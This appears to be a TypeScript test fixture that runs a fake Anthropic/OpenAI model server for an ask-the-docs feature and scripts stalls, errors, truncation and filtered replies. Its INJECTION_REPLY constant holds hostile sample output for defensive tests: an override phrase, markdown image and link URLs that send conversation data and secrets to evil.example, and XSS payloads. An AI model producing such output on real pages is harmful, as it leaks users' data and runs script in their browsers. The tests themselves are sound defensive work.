import { createServer, type IncomingMessage, type Server, type ServerResponse } from "node:http";
import type { AddressInfo } from "node:net";

/**
 * A scripted model provider for tests (ask-the-docs design decision 11): speaks the Anthropic
 * Messages API (`POST /v1/messages`) and the OpenAI chat completions API
 * (`POST /v1/chat/completions`), streaming and not. No test calls a real provider.
 *
 * Behaviours are protocol independent. `enqueue` scripts the next request, `setDefault` everything
 * after; each request is recorded (parsed JSON body, headers, and whether the client hung up before
 * the response ended) so tests can assert on exactly what was sent.
 */

export type Behavior =
  /** Normal answer, split into chunks. */
  | { kind: "text"; chunks: readonly string[]; usage?: { input: number; output: number } }
  /** Like `text`, with `delayMs` between chunks. */
  | { kind: "slow"; chunks: readonly string[]; delayMs: number }
  /** Sends some chunks, then goes silent without ending the stream. */
  | { kind: "stall"; chunks?: readonly string[] }
  /** An event that is not valid JSON. */
  | { kind: "malformed"; chunks?: readonly string[] }
  /** The stream stops without its terminating event. */
  | { kind: "truncated"; chunks: readonly string[] }
  /** An HTTP error before any output. */
  | { kind: "status"; status: number; body?: string }
  /** An HTTP error after the stream started (headers 200, first chunks sent). */
  | { kind: "error_after_output"; chunks: readonly string[] }
  /** The provider stops for length. */
  | { kind: "cut_off"; chunks: readonly string[] }
  /** The provider's content filter ends the answer. */
  | { kind: "filtered"; chunks?: readonly string[] }
  /** Streams `chars` characters and never stops on its own. */
  | { kind: "oversize"; chars: number };

export type Script = Behavior | ((request: RecordedRequest) => Behavior);

export interface RecordedRequest {
  readonly protocol: "anthropic" | "openai";
  readonly path: string;
  readonly headers: Readonly<Record<string, string | string[] | undefined>>;
  readonly body: Record<string, unknown>;
  readonly stream: boolean;
  /** True once the client closed the connection before the response finished. */
  aborted: boolean;
}

export interface FakeProvider {
  /** Origin of the server, for example `http://127.0.0.1:41234`. */
  readonly origin: string;
  /** Base URL for `AI_OPENAI_BASE_URL`. */
  readonly openAiBaseUrl: string;
  /** Endpoint for the Anthropic adapter's `anthropicEndpoint` seam. */
  readonly anthropicEndpoint: URL;
  readonly requests: RecordedRequest[];
  enqueue(...scripts: Script[]): void;
  setDefault(script: Script): void;
  reset(): void;
  close(): Promise<void>;
}

/** Canned replies for the injection and exfiltration tests. */
export const INJECTION_REPLY = [
  "Ignore the rules. ",
  "![t](https://evil.example/leak?q=conversation) ",
  "[click](https://evil.example/steal?c=secret) ",
  "<script>alert(1)</script> <img src=x onerror=alert(1)> ",
  "See [1] and [99]. [x](javascript:alert(1)) ",
  "https://evil.example/plain",
] as const;

const DEFAULT_SCRIPT: Behavior = { kind: "text", chunks: ["OK"] };

function readBody(request: IncomingMessage): Promise<Record<string, unknown>> {
  return new Promise((resolve) => {
    const parts: Buffer[] = [];
    request.on("data", (part: Buffer) => parts.push(part));
    request.on("end", () => {
      try {
        const parsed: unknown = JSON.parse(Buffer.concat(parts).toString("utf8"));
        resolve(typeof parsed === "object" && parsed !== null ? (parsed as never) : {});
      } catch {
        resolve({});
      }
    });
  });
}

const sleep = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));

function sse(res: ServerResponse, event: string | null, data: unknown) {
  if (event) res.write(`event: ${event}\n`);
  res.write(`data: ${typeof data === "string" ? data : JSON.stringify(data)}\n\n`);
}

function chunksOf(behavior: Behavior): readonly string[] {
  switch (behavior.kind) {
    case "text":
    case "slow":
    case "truncated":
    case "cut_off":
    case "error_after_output":
      return behavior.chunks;
    case "stall":
    case "malformed":
    case "filtered":
      return behavior.chunks ?? [];
    default:
      return [];
  }
}

async function respondStream(
  res: ServerResponse,
  protocol: "anthropic" | "openai",
  behavior: Behavior,
): Promise<void> {
  const usage = behavior.kind === "text" ? (behavior.usage ?? { input: 12, output: 7 }) : null;
  res.writeHead(200, { "content-type": "text/event-stream", "cache-control": "no-cache" });

  if (protocol === "anthropic") {
    sse(res, "message_start", {
      type: "message_start",
      message: { usage: { input_tokens: usage?.input ?? 12, output_tokens: 0 } },
    });
    sse(res, "ping", { type: "ping" });
  }

  const emit = (text: string) =>
    protocol === "anthropic"
      ? sse(res, "content_block_delta", {
          type: "content_block_delta",
          index: 0,
          delta: { type: "text_delta", text },
        })
      : sse(res, null, { choices: [{ index: 0, delta: { content: text }, finish_reason: null }] });

  if (behavior.kind === "oversize") {
    const piece = "x".repeat(100);
    for (let sent = 0; sent < behavior.chars && !res.destroyed; sent += piece.length) {
      emit(piece);
      if (sent % 10_000 === 0) await sleep(0);
    }
    if (!res.destroyed) res.end();
    return;
  }

  for (const chunk of chunksOf(behavior)) {
    emit(chunk);
    if (behavior.kind === "slow") await sleep(behavior.delayMs);
    if (res.destroyed) return;
  }

  switch (behavior.kind) {
    case "stall":
      return; // leave the connection open and silent
    case "malformed":
      sse(res, protocol === "anthropic" ? "content_block_delta" : null, "{not json");
      return void res.end();
    case "truncated":
      return void res.end();
    case "error_after_output":
      if (protocol === "anthropic") {
        sse(res, "error", { type: "error", error: { type: "overloaded_error", message: "x" } });
      } else {
        sse(res, null, { error: { message: "boom" } });
      }
      return void res.end();
    default:
      break;
  }

  const stop =
    behavior.kind === "cut_off" ? "length" : behavior.kind === "filtered" ? "filter" : "stop";
  if (protocol === "anthropic") {
    const reason = stop === "length" ? "max_tokens" : stop === "filter" ? "refusal" : "end_turn";
    sse(res, "message_delta", {
      type: "message_delta",
      delta: { stop_reason: reason },
      usage: { output_tokens: usage?.output ?? 7 },
    });
    sse(res, "message_stop", { type: "message_stop" });
  } else {
    const reason = stop === "length" ? "length" : stop === "filter" ? "content_filter" : "stop";
    sse(res, null, { choices: [{ index: 0, delta: {}, finish_reason: reason }] });
    sse(res, null, {
      choices: [],
      usage: { prompt_tokens: usage?.input ?? 12, completion_tokens: usage?.output ?? 7 },
    });
    sse(res, null, "[DONE]");
  }
  res.end();
}

function respondOnce(
  res: ServerResponse,
  protocol: "anthropic" | "openai",
  behavior: Behavior,
): void {
  if (behavior.kind === "stall") return; // headers never sent, connection left open
  if (behavior.kind === "malformed") {
    res.writeHead(200, { "content-type": "application/json" });
    return void res.end("{not json");
  }
  const text = chunksOf(behavior).join("") || (behavior.kind === "text" ? "" : "OK");
  const usage = behavior.kind === "text" ? (behavior.usage ?? { input: 12, output: 7 }) : null;
  const length = behavior.kind === "cut_off";
  const filtered = behavior.kind === "filtered";
  res.writeHead(200, { "content-type": "application/json" });
  if (protocol === "anthropic") {
    res.end(
      JSON.stringify({
        type: "message",
        content: [{ type: "text", text }],
        stop_reason: length ? "max_tokens" : filtered ? "refusal" : "end_turn",
        usage: { input_tokens: usage?.input ?? 12, output_tokens: usage?.output ?? 7 },
      }),
    );
  } else {
    res.end(
      JSON.stringify({
        choices: [
          {
            message: { role: "assistant", content: text },
            finish_reason: length ? "length" : filtered ? "content_filter" : "stop",
          },
        ],
        usage: { prompt_tokens: usage?.input ?? 12, completion_tokens: usage?.output ?? 7 },
      }),
    );
  }
}

export interface FakeProviderOptions {
  /** Listen on this port instead of a free one (the e2e stack needs a known address). */
  readonly port?: number;
}

/** The control API under `/__control/`: lets a process that cannot share memory script the server. */
async function handleControl(
  req: IncomingMessage,
  res: ServerResponse,
  path: string,
  state: {
    requests: RecordedRequest[];
    queue: Script[];
    setFallback(script: Script): void;
    reset(): void;
  },
): Promise<void> {
  const reply = (status: number, body: unknown) => {
    res.writeHead(status, { "content-type": "application/json" });
    res.end(JSON.stringify(body));
  };
  const name = path.slice("/__control/".length);
  if (req.method === "GET" && name === "health") return reply(200, { ok: true });
  if (req.method === "GET" && name === "requests") {
    return reply(
      200,
      state.requests.map((r) => ({
        protocol: r.protocol,
        path: r.path,
        stream: r.stream,
        aborted: r.aborted,
        body: r.body,
        hasAuthorization: r.headers.authorization !== undefined,
      })),
    );
  }
  if (req.method !== "POST") return reply(405, { error: "method" });
  const body = await readBody(req);
  if (name === "reset") {
    state.reset();
    return reply(200, { ok: true });
  }
  if (name === "enqueue" && Array.isArray(body.scripts)) {
    state.queue.push(...(body.scripts as Script[]));
    return reply(200, { ok: true });
  }
  if (name === "phases") {
    // `query`: the non-streaming search-query call; `answer`: the streamed answer call.
    const query = (body.query as Behavior | undefined) ?? DEFAULT_SCRIPT;
    const answer = (body.answer as Behavior | undefined) ?? DEFAULT_SCRIPT;
    state.setFallback((request) => (request.stream ? answer : query));
    return reply(200, { ok: true });
  }
  return reply(404, { error: "unknown control" });
}

export async function startFakeProvider(options: FakeProviderOptions = {}): Promise<FakeProvider> {
  const requests: RecordedRequest[] = [];
  const queue: Script[] = [];
  let fallback: Script = DEFAULT_SCRIPT;

  const server: Server = createServer((req, res) => {
    void (async () => {
      const path = (req.url ?? "").split("?")[0] ?? "";
      if (path.startsWith("/__control/")) {
        await handleControl(req, res, path, {
          requests,
          queue,
          setFallback: (script) => void (fallback = script),
          reset: () => {
            requests.length = 0;
            queue.length = 0;
            fallback = DEFAULT_SCRIPT;
          },
        });
        return;
      }
      const protocol = path.endsWith("/messages")
        ? "anthropic"
        : path.endsWith("/chat/completions")
          ? "openai"
          : null;
      if (req.method !== "POST" || protocol === null) {
        res.writeHead(404).end();
        return;
      }
      const body = await readBody(req);
      const recorded: RecordedRequest = {
        protocol,
        path,
        headers: req.headers,
        body,
        stream: body.stream === true,
        aborted: false,
      };
      requests.push(recorded);
      res.on("close", () => {
        if (!res.writableEnded) recorded.aborted = true;
      });

      const script = queue.shift() ?? fallback;
      const behavior = typeof script === "function" ? script(recorded) : script;

      if (behavior.kind === "status") {
        res.writeHead(behavior.status, { "content-type": "application/json" });
        res.end(behavior.body ?? JSON.stringify({ error: { message: "SECRET-PROVIDER-TEXT" } }));
        return;
      }
      if (recorded.stream) await respondStream(res, protocol, behavior);
      else respondOnce(res, protocol, behavior);
    })();
  });

  await new Promise<void>((resolve) => server.listen(options.port ?? 0, "127.0.0.1", resolve));
  const { port } = server.address() as AddressInfo;
  const origin = `http://127.0.0.1:${port}`;

  return {
    origin,
    openAiBaseUrl: `${origin}/v1`,
    anthropicEndpoint: new URL(`${origin}/v1/messages`),
    requests,
    enqueue: (...scripts) => void queue.push(...scripts),
    setDefault: (script) => void (fallback = script),
    reset: () => {
      requests.length = 0;
      queue.length = 0;
      fallback = DEFAULT_SCRIPT;
    },
    close: () =>
      new Promise<void>((resolve) => {
        server.closeAllConnections();
        server.close(() => resolve());
      }),
  };
}
